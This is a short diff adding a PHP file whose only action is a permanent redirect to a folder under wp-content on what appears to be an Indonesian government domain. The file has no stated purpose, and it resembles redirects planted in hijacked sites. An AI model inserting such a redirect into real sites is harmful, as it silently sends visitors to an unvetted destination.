@@ -1,0 +1,3 @@
+<?php
+
+header('Location: https://kejari-kediri.kejaksaan.go.id/wp-content/butuh-demo/', true, 301);
